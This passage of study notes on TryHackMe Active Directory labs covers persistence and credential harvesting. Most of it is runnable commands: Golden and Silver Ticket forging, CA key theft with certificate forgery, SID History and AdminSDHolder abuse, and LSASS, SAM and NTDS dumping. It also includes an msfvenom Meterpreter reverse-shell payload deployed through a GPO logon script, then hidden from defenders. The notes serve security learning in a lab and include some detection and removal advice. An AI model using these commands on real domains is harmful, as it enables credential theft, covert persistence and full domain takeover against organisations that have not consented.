- `THMSERVER1$` machine account NTLM hash from DCSync.
- User RID (default Administrator RID: `500`).

### **5. Generate Golden Ticket**

```
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
```

Parameters:

- `/admin` — Impersonated username; can be non-existent.
- `/domain` — Domain FQDN.
- `/id` — User RID.
- `/sid` — Domain SID.
- `/krbtgt` — KRBTGT NTLM hash.
- `/endin` — Ticket lifetime in minutes (600 = 10 hours).
- `/renewmax` — Maximum renewal lifetime (10080 = 7 days).
- `/ptt` — Inject ticket into current session.

Verify:

```
dir \\thmdc.za.tryhackme.loc\c$\
```

### **6. Generate Silver Ticket**

```
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
```

Parameters:

- `/admin` — Impersonated username.
- `/domain` — Domain FQDN.
- `/id` — User RID.
- `/sid` — Domain SID.
- `/target` — Target hostname (`THMSERVER1.za.tryhackme.loc`).
- `/rc4` — Target machine account NTLM hash (`THMSERVER1$`).
- `/service` — Target service (`cifs` = file access).
- `/ptt` — Inject ticket into current session.

Verify:

```
dir \\thmserver1.za.tryhackme.loc\c$\
```

**Key takeaway:** Golden Tickets provide broad domain persistence using the KRBTGT hash. Silver Tickets provide stealthier, service-specific persistence using a machine account hash.


### --------------------------------- Persistence through Certificates -----------------------------------

## **Persistence through Certificates**

Highly invasive

Certificate persistence is difficult to remove and may require a full domain rebuild. In real red-team engagements, these techniques should generally be simulated unless explicitly approved.

### **1. Why Certificate Persistence?**

- Credential rotation does not invalidate an existing certificate.
- A Client Authentication certificate can request Kerberos TGTs.
- Access remains until the certificate expires or is revoked.
- Stealing the **Root CA private key** allows forging certificates independently.
- Forged certificates created outside the CA are not listed in its issued-certificate database, making individual revocation difficult.

### **2. Extract CA Private Key**

CA private key is protected by machine DPAPI unless hardware protection (HSM) is used.

SSH into `THMDC` as Administrator:

```
mkdir <username>
cd <username>
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

List certificates:

```
crypto::certificates /systemstore:local_machine
```

Enable debug and patch cryptographic services:

```
privilege::debug
crypto::capi
crypto::cng
```

Export certificates:

```
crypto::certificates /systemstore:local_machine /export
```

- Exported as `.pfx` and `.der`.
- Important file: `za-THMDC-CA.pfx`
- Default export password: `mimikatz`

Copy the PFX to `THMWRK1` using SCP.

### **3. Forge Your Own Certificate**

Use SpecterOps **ForgeCert**:

```
C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

Parameters:

- `CaCertPath` — Exported CA certificate.
- `CaCertPassword` — CA certificate password.
- `Subject` — Certificate common name.
- `SubjectAltName` — Target user's UPN (must exist).
- `NewCertPath` — Output certificate.
- `NewCertPassword` — New PFX password.

### **4. Request TGT Using Forged Certificate**

```
C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>
```

Parameters:

- `/user` — Impersonated user; must match certificate UPN.
- `/enctype` — Ticket encryption type (`aes256`).
- `/certificate` — Forged certificate path.
- `/password` — PFX password.
- `/outfile` — TGT output file.
- `/domain` — Domain FQDN.
- `/dc` — Domain Controller IP.

### **5. Load TGT with Mimikatz**

```
kerberos::ptt administrator.kirbi
exit
```

Verify access:

```
dir \\THMDC.za.tryhackme.loc\c$\
```

### **6. Removing Certificate Persistence**

- Rotating user passwords does not remove access.
- Individually revoking the forged certificate is generally impossible because it was never issued through the CA.
- Revoking the **Root CA certificate** invalidates certificates issued by that CA.
- The organisation may need to replace certificates across systems and rebuild affected infrastructure.

**Key takeaway:** Stealing the CA private key allows attackers to forge trusted certificates and maintain credential-independent persistence. This is extremely dangerous and can require a major infrastructure recovery.


### --------------------------------- Persistence through SID History -----------------------------------

## **Persistence through SID History**

**SID History:** An AD attribute that stores previous/additional SIDs for an account. Originally used during domain migrations so users retain access to old-domain resources.

### **1. SID History Abuse**

Attackers can add privileged group SIDs to a low-privileged account's SID History.

- Requires Domain Admin or equivalent privileges.
- SIDs are added to the user's access token during authentication.
- Adding the **Domain Admins SID (**`-512`**)** grants effective DA privileges.
- Adding **Enterprise Admins SID (**`-519`**)** can grant forest-wide privileges.
- Account can still appear as a normal Domain Users member.

### **2. Check Existing SID History**

```
Get-ADUser <your ad username> -properties sidhistory,memberof
```

Example Domain Admins SID:

```
S-1-5-21-3885271727-2693558621-2658995185-512
```

Get it:

```
Get-ADGroup "Domain Admins"
```

### **3. Modify SID History**

Tool: [DSInternals](https://github.com/MichaelGrafnetter/DSInternals?utm_source=chatgpt.com).

Mimikatz has issues patching LSASS for this technique. DSInternals modifies the AD database (`ntds.dit`).

```
Stop-Service -Name ntds -force
Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service -Name ntds
```



Important

&#x20;NTDS must be stopped to modify the database. **Restart NTDS afterward**, or domain authentication may stop working.



### **4. Verify Persistence**

```
Get-ADUser aaron.jones -Properties sidhistory
```

Expected:

```
SIDHistory : {S-1-5-21-3885271727-2693558621-2658995185-512}
```

Test DA access:

```
dir \\thmdc.za.tryhackme.loc\c$
```

### **5. Detection and Removal**

- Normal group-membership enumeration will not show the malicious privilege.
- Blue team must inspect users' `SIDHistory` attributes.
- SID History is applied when the user authenticates.
- Even highly privileged administrators cannot simply remove it through the AD Users and Groups GUI.
- Use AD-RSAT PowerShell tools to remove malicious SID History.

**Key takeaway:** SID History abuse provides stealthy persistence by granting privileged SIDs to an ordinary account without adding it to privileged groups.


### --------------------------------- Persistence through Group Membership -----------------------------------

## **Persistence through Group Membership**

**Goal:** Maintain privileged access by adding controlled accounts to AD groups, preferably through nested groups instead of directly joining protected groups.

### **1. Target Groups**

- **IT Support:** May have `ForceChangePassword` permissions.
- **Local Admin groups:** Provide administrative access to multiple machines.
- **GPO owners:** Can modify policies and gain access to targeted systems.

Protected groups like `Domain Admins` and `Enterprise Admins` are monitored more closely.

### **2. Nested Groups**

**Nested group:** A group that is a member of another group.

Example:

`User → Group 1 → Group 2 → Group 3 → Domain Admins`

- Members inherit the effective permissions of parent groups.
- Nested membership makes effective privileges harder to identify.
- Monitoring only direct membership changes can miss privilege escalation.

### **3. Create Nested Groups**

Create Group 1 in IT OU:

```
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

Create Group 2 in Sales OU and nest Group 1:

```
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
```

Create Groups 3–5, nesting each previous group:

```
New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"

New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"

New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security

Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"
```

Add Group 5 to Domain Admins:

```
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
```

Add your low-privileged user to Group 1:

```
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

### **4. Verify Access**

Check Domain Admins membership:

```
Get-ADGroupMember -Identity "Domain Admins"
```

Only Group 5 appears as a new direct member, while your user inherits its privileges through nesting.

Test DC access:

```
dir \\thmdc.za.tryhackme.loc\c$\
```



High impact

&#x20;In real assessments, creating nested privileged groups can damage AD structure and make recovery difficult. Usually simulate this technique rather than perform it.



**Key takeaway:** Nested groups hide effective privileged access behind indirect membership. Monitoring must inspect recursive group membership, not just direct members.


### --------------------------------- Persistence through ACLs -----------------------------------

### **Persistence through ACLs**

- **AdminSDHolder**: AD container under `Domain → System`; its ACL acts as a template for all protected groups (Domain Admins, Administrators, Enterprise Admins, Schema Admins, etc.).
- **SDProp**: Copies AdminSDHolder permissions to protected groups every **60 minutes**. Changes reappear even after blue-team cleanup.

**Configure AdminSDHolder (MMC):**

Run with Administrator credentials:

```
runas /netonly /user:thmchilddc.tryhackme.loc\Administrator cmd.exe
```

MMC → Add **Active Directory Users and Computers** snap-in → View → Advanced Features → Domain → System → AdminSDHolder → Properties → Security.

Add low-privileged user → **Allow: Full Control** → Apply.

**Force SDProp manually:**

```
Import-Module .\Invoke-ADSDPropagation.ps1
Invoke-ADSDPropagation
```

Script location: `C:\Tools\Invoke-ADSDPropagation.ps1`

**Result:**

- After propagation, the user gets Full Control over all protected groups.
- Removing the user's permission is temporary; running SDProp again restores it.
- Full Control does **not** automatically add the user to the group; it allows the user to modify the group and add themselves.
- Combining AdminSDHolder persistence with nested groups makes cleanup harder.
- Granting Full Control to `Domain Users` affects all domain users.
- Combining with DC Sync creates severe domain-wide persistence.

Protected groups list: [Microsoft documentation](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593\(v=msdn.10\)?utm_source=chatgpt.com)


### --------------------------------- Persistence through GPOs -----------------------------------

### **Persistence through GPOs**

**GPO persistence:** Deploys persistence across domain computers through centralized policies.

**Common techniques:**

- **Restricted Group Membership:** Gain admin access on multiple hosts.
- **Logon Script:** Execute a script whenever an administrator logs in.

**1. Prepare payload and script**

Generate Meterpreter payload:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
```

Batch script `<username>_script.bat`:

```
copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe
```

Copies payload → waits 20 seconds → executes it.

Upload to SYSVOL:

```
scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
```

Start listener:

```
msfconsole -q -x "use exploit/multi/handler; set payload  windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT  4445;exploit"
```

**2. Create GPO**

Using Administrator through MMC → Group Policy Management:

1. Right-click `Admins` OU → Create a GPO and link it.
2. Name it `<username> - persisting GPO`.
3. Right-click GPO → **Enforced** → Edit.
4. Navigate to `User Configuration → Policies → Windows Settings → Scripts (Logon/Logoff)`.
5. Logon → Properties → Scripts → Add → Browse.
6. Select `<username>_script.bat` → Apply.

**Result:** Whenever an administrator in the linked OU logs into a machine, the script executes and triggers a callback.

**Important:** A session disconnect does not trigger Logon. The user must **sign out** and log in again.

**3. Hide the GPO**

Under GPO → Delegation:

- Remove editing permissions from other groups (except `Authenticated Users`).
- Under Advanced, remove `Created Owner` permissions.
- Replace `Authenticated Users` with `Domain Computers` and grant **Read** permission.
- Remove `Authenticated Users`.

**Result:**

- Users can no longer read the policy.
- Domain computers can still read and apply it.
- GPO becomes difficult for defenders to discover and remove.
- Even administrators may lose access to manage the GPO; recovery may require a network reset.

**Core idea:** GPO logon scripts provide recurring access, while modifying GPO delegation and read permissions makes the persistence harder to detect and remove.





## Credentials Harvesting

### --------------------------------- Credential Access -----------------------------------

### **Credential Access**

**Credential Access (MITRE TA0006):** Finding credentials on compromised systems to reuse them or impersonate users. Helps with lateral movement and accessing other resources.

[MITRE ATT&CK – TA0006](https://attack.mitre.org/tactics/TA0006/?utm_source=chatgpt.com)

**Common credential storage locations:**

| Location          | What to look for                                                        |
| ----------------- | ----------------------------------------------------------------------- |
| Clear-text files  | Passwords, private keys, command history, configs, backups, source code |
| Database files    | Application credentials and configurations                              |
| Password managers | Stored website/service logins (KeePass, 1Password, LastPass)            |
| Memory            | Clear-text credentials, cached passwords, AD tickets                    |
| Active Directory  | User descriptions, SYSVOL keys, NTDS, AD misconfigurations              |
| Network           | NTLM hashes captured through MITM attacks                               |

**Important examples**

PowerShell history:

```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Search registry for `password`:

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**Active Directory credential leaks:**

- **User Description:** Admins may accidentally store passwords in descriptions.
- **SYSVOL:** May contain leaked encryption keys.
- **NTDS:** Contains AD user credential data.
- **AD Misconfigurations:** Can expose credentials through different attacks.

**Memory:** Requires sufficient privileges to access sensitive runtime data.

**Network Sniffing:** MITM attacks can capture authentication information such as NTLM hashes.

**MITRE technique:** [T1552.001 – Credentials In Files](https://attack.mitre.org/techniques/T1552/001/?utm_source=chatgpt.com)


### --------------------------------- Local Windows Credentials -----------------------------------

### **Local Windows Credentials**

**Local vs Domain users**

- Local credentials: Stored on the Windows machine.
- Domain credentials: Stored centrally in Active Directory.

### **1. Keylogging**

- Records keyboard input to capture passwords and other sensitive data.
- Can use Metasploit or other keyloggers.
- THM: [Exploiting AD – Task 5](https://tryhackme.com/room/exploitingad?utm_source=chatgpt.com)

### **2. SAM (Security Account Manager)**

- Stores local Windows usernames and password hashes.
- Encrypted and locked while Windows is running.

**Metasploit Hashdump**

Requires suitable privileges:

```
getuid
hashdump
```

Uses LSASS in-memory code injection to dump hashes.

[Rapid7 – Hashdump](https://www.rapid7.com/blog/post/2010/01/01/safe-reliable-hash-dumping/?utm_source=chatgpt.com)

### **3. Volume Shadow Copy**

Creates a backup snapshot, allowing access to locked SAM and SYSTEM files.

Create shadow copy:

```
wmic shadowcopy call create Volume='C:\'
```

List shadow copies:

```
vssadmin list shadows
```

Example shadow path:

```
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Copy SAM and SYSTEM:

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
```

- `SAM`: Contains local account hashes.
- `SYSTEM`: Contains the key (bootKey) needed to decrypt SAM.

[Microsoft – Volume Shadow Copy Service](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service?utm_source=chatgpt.com)

### **4. Registry Hives**

Save SAM and SYSTEM using `reg.exe` (Administrator CMD):

```
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```

Decrypt using Impacket:

```
python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
```

**Parameters:**

- `-sam`: SAM file path.
- `-system`: SYSTEM file path.
- `LOCAL`: Decrypt local SAM hashes.

### **Important**

- Metasploit `hashdump` can show hashes belonging to AD accounts too.
- SAM + SYSTEM extracts local account hashes.
- To decrypt cached/domain-related credentials, additional data from the `SECURITY` hive may be needed.
- Extracted NTLM hashes can be cracked with Hashcat or used in authorized hash-based authentication testing.


### --------------------------------- Local Security Authority Subsystem Service (LSASS). -----------------------------------

### **LSASS (Local Security Authority Subsystem Service)**

- **LSASS (**`lsass.exe`**)** enforces Windows security policies and handles authentication.
- Stores sensitive credentials in memory: passwords, NTLM hashes, Kerberos tickets.
- Used for accessing network resources without entering credentials repeatedly.
- Requires Administrator/SYSTEM privileges to access its memory.

**MITRE:** [T1003.001 – OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/?utm_source=chatgpt.com)

### **1. Dump LSASS using GUI**

Task Manager → Details → `lsass.exe` → Right-click → **Create dump file**.

Copy dump:

```
copy C:\Users\ADMINI~1\AppData\Local\Temp\2\lsass.DMP C:\Tools\Mimikatz\lsass.DMP
```

### **2. Dump using ProcDump**

Location: `C:\Tools\SysinternalsSuite`

```
C:\Tools\SysinternalsSuite\procdump.exe -accepteula -ma lsass.exe C:\Tools\Mimikatz\lsass_dump
```

Creates an LSASS memory dump (`.dmp`). AV may detect this activity.

### **3. Extract credentials using Mimikatz**

[Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz?utm_source=chatgpt.com)

Run as Administrator:

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

- `privilege::debug`: Enables SeDebugPrivilege.
- `sekurlsa::logonpasswords`: Extracts cached credentials from LSASS.
- Output may contain NTLM, SHA1 and DPAPI data.

**Important:** The user must have logged in, and their credentials must be cached.

### **4. Protected LSASS (RunAsPPL)**

Windows LSA protection prevents unauthorized access to LSASS memory.

Registry location:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
```

`RunAsPPL = 1` means LSA protection is enabled.

Error when protected:

```
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

`0x00000005` = Access Denied.

In the authorized THM lab, Mimikatz provides `mimidrv.sys` for demonstrating protection removal:

```
!+
!processprotect /process:lsass.exe /remove
```

Then:

```
sekurlsa::logonpasswords
```

**Remember:** LSASS is a major credential target because it stores authentication data in memory.


### --------------------------------- Windows Credential Manager -----------------------------------

### **Windows Credential Manager**

**Credential Manager:** Stores usernames, passwords and authentication details for websites, applications and networks.

**Four credential categories:**

| Type              | Stores                          |
| ----------------- | ------------------------------- |
| Web               | Browser/application credentials |
| Windows           | NTLM/Kerberos authentication    |
| Generic           | Basic username/password         |
| Certificate-based | Certificate authentication      |

Credentials are stored in individual user folders and are not shared between Windows accounts, but may be cached in memory.

### **1. Enumerate with&#x20;**`vaultcmd`

List available vaults:

```
vaultcmd /list
```

Check vault properties:

```
VaultCmd /listproperties:"Web Credentials"
```

List stored credentials:

```
VaultCmd /listcreds:"Web Credentials"
```

**Note:** `vaultcmd` shows credential details but not the actual password.

### **2. Extract Web Passwords**

[Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1?utm_source=chatgpt.com)

```
powershell -ex bypass
Import-Module C:\Tools\Get-WebCredentials.ps1
Get-WebCredentials
```

Extracts saved browser credentials, including usernames and clear-text passwords.

### **3. RunAs + cmdkey**

`cmdkey` enumerates stored Windows credentials.

```
cmdkey /list
```

Run a command as another user using saved credentials:

```
runas /savecred /user:THM.red\thm-local cmd.exe
```

- `/savecred`: Saves credentials in Windows Credential Manager.
- `/user`: Specifies the account.
- The next execution can reuse saved credentials without asking for the password.

Verify identity:

```
whoami
```

### **4. Mimikatz**

Extract Credential Manager credentials from memory:

```
privilege::debug
sekurlsa::credman
```

- `privilege::debug`: Enables SeDebugPrivilege.
- `sekurlsa::credman`: Extracts cached Credential Manager credentials.

**Remember:**

- `vaultcmd` → Enumerate vaults and credentials.
- `Get-WebCredentials.ps1` → Extract Web passwords.
- `cmdkey` → Enumerate saved Windows credentials.
- `runas /savecred` → Reuse saved credentials.
- `sekurlsa::credman` → Extract credentials from memory.


### --------------------------------- Domain Controller -----------------------------------

### **Domain Controller – NTDS**

**NTDS (New Technology Directory Services):**

- Active Directory database containing objects, attributes, users, groups and credentials.
- Default location: `C:\Windows\NTDS\ntds.dit`
- Locked while AD is running.
- Requires `SYSTEM` Boot Key and `SECURITY` data for decryption.

**NTDS database tables:**

1. Schema – Object types and relationships.
2. Link – Object attributes and values.
3. Data – Users and groups.

### **1. Local Dumping (No AD Credentials)**

Requires Administrator access to the Domain Controller.

**Required files:**

```
C:\Windows\NTDS\ntds.dit
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
```

Dump using `ntdsutil`:

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

Creates `Active Directory` and `registry` folders inside `C:\temp`.

Extract hashes using Impacket:

```
python3.9 /opt/impacket/examples/secretsdump.py -security path/to/SECURITY -system path/to/SYSTEM -ntds path/to/ntds.dit local
```

### **2. Remote Dumping (With Credentials)**

Requires Domain Controller administrative access or special AD replication permissions.

**DC Sync**

Uses AD replication to retrieve domain credentials remotely.

Required permissions:

- `Replicating Directory Changes`
- `Replicating Directory Changes All`
- `Replicating Directory Changes in Filtered Set`

Using Impacket:

```
python3.9 /opt/impacket/examples/secretsdump.py -just-dc THM.red/<AD_Admin_User>@MACHINE_IP
```

- `-just-dc`: Extract NTDS domain data.
- `THM.red/<AD_Admin_User>`: Domain/user credentials.

Dump only NTLM hashes:

```
python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@MACHINE_IP
```

### **3. Crack NTLM Hashes**

```
hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt
```

- `-m 1000`: Windows NTLM hash mode.
- `-a 0`: Dictionary attack.

**Remember:**

| Method           | Requirement                                         |
| ---------------- | --------------------------------------------------- |
| Local NTDS dump  | DC Administrator access                             |
| Remote DC Sync   | AD replication permissions or suitable admin access |
| `secretsdump.py` | Extracts hashes from NTDS or DC Sync                |
| Hashcat          | Cracks extracted NTLM hashes                        |

**Reference:** [Microsoft – Ntdsutil](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753343\(v=ws.11\)?utm_source=chatgpt.com)

[THM – Persisting AD, Task 2](https://tryhackme.com/room/persistingad?utm_source=chatgpt.com)


### --------------------------------- Local Administrator Password Solution (LAPS) -----------------------------------

### **Local Administrator Password Solution (LAPS)**

### **1. Group Policy Preferences (GPP)**

- GPP allowed administrators to deploy local admin passwords through Group Policy.
- Passwords were stored in XML files inside **SYSVOL**.
- Passwords were encrypted using AES-256.
- Microsoft published the encryption key on MSDN, allowing domain users to decrypt them.

Tool: [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1?utm_source=chatgpt.com)

### **2. LAPS**

Introduced in 2015 to securely manage local Administrator passwords.

Two AD computer attributes:

| Attribute                     | Purpose                                           |
| ----------------------------- | ------------------------------------------------- |
| `ms-mcs-AdmPwd`               | Stores local Administrator password in clear text |
| `ms-mcs-AdmPwdExpirationTime` | Password expiration/reset time                    |

`AdmPwd.dll` changes the local password and updates AD.

### **3. Enumerate LAPS**

Check installation:

```
dir "C:\Program Files\LAPS\CSE"
```

Look for `AdmPwd.dll`.

List LAPS PowerShell commands:

```
Get-Command *AdmPwd*
```

Find users/groups with extended rights:

```
Find-AdmPwdExtendedRights -Identity THMorg
```

Use `-Identity *` to enumerate all OUs.

Check group members:

```
net groups "THMGroupReader"
```

Check user group membership:

```
net user test-admin
```

### **4. Retrieve LAPS Password**

After obtaining an account with the required LAPS read permission:

```
Get-AdmPwdPassword -ComputerName creds-harvestin
```

Returns:

- Computer name
- Distinguished Name
- Local Administrator password
- Expiration timestamp

**Tools:**

- [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit?utm_source=chatgpt.com) – PowerShell enumeration toolkit.
- Location in THM VM: `C:\Tool`

**Remember:**

- GPP → Old method; encrypted passwords leaked through SYSVOL.
- LAPS → Randomized, centrally managed local admin passwords.
- `Find-AdmPwdExtendedRights` → Find who can read LAPS passwords.
- `Get-AdmPwdPassword` → Retrieve password for an authorized computer.
- LAPS is enabled only on selected machines, not necessarily the entire domain.


### --------------------------------- Other Attacks -----------------------------------

### **Other Attacks – Credential Access**

These attacks obtain AD credentials/hashes through network authentication mechanisms.

### **1. Kerberoasting**

- Targets accounts with **SPNs (Service Principal Names)**, e.g. IIS, MSSQL.
- Requests a TGS ticket for an SPN account.
- Extracts the ticket and cracks it offline to recover the service account password.

Enumerate SPN accounts:

```
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm
```

Request TGS:

```
python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-user
```

Crack ticket:

```
hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
```

`-m 13100` = Kerberos 5 TGS-REP etype 23.

[THM – Persisting AD (Task 3)](https://tryhackme.com/room/persistingad?utm_source=chatgpt.com)

### **2. AS-REP Roasting**

- Targets AD users with **Do not require Kerberos pre-authentication** enabled.
- Requests an AS-REP response without pre-authentication.
- Extracts a hash and cracks it offline.

User list example (`users.lst`):

```
Administrator
admin
thm
test
sshd
victim
CREDS-HARVESTIN$
```

Enumerate and retrieve hashes:

```
python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt
```

- `-dc-ip`: Domain Controller IP.
- `-usersfile`: List of domain usernames.
- `-format`: Export ticket in John/Hashcat format.

### **3. SMB Relay Attack**

- Abuses NTLM challenge-response authentication.
- Attacker performs MITM and relays captured authentication to another system.
- **Requirement:** SMB signing must be disabled.
- Goal: Gain access using relayed authentication.

[THM – Exploiting AD](https://tryhackme.com/room/exploitingad?utm_source=chatgpt.com)

### **4. LLMNR/NBNS Poisoning**

- LLMNR and NBNS help resolve hostnames when DNS fails.
- Attacker responds to multicast name-resolution requests while impersonating the requested host.
- Victim may send NTLM authentication information to the attacker.
- Goal: Capture NTLM hashes.

[THM – Breaching AD](https://tryhackme.com/room/breachingad?utm_source=chatgpt.com)

**Quick Revision**

| Attack               | Target / Requirement                    | Result                 |
| -------------------- | --------------------------------------- | ---------------------- |
| Kerberoasting        | SPN accounts                            | TGS hash               |
| AS-REP Roasting      | No Kerberos pre-authentication          | AS-REP hash            |
| SMB Relay            | NTLM + SMB signing disabled             | Relayed authentication |
| LLMNR/NBNS Poisoning | DNS failure + name-resolution poisoning | NTLM capture           |


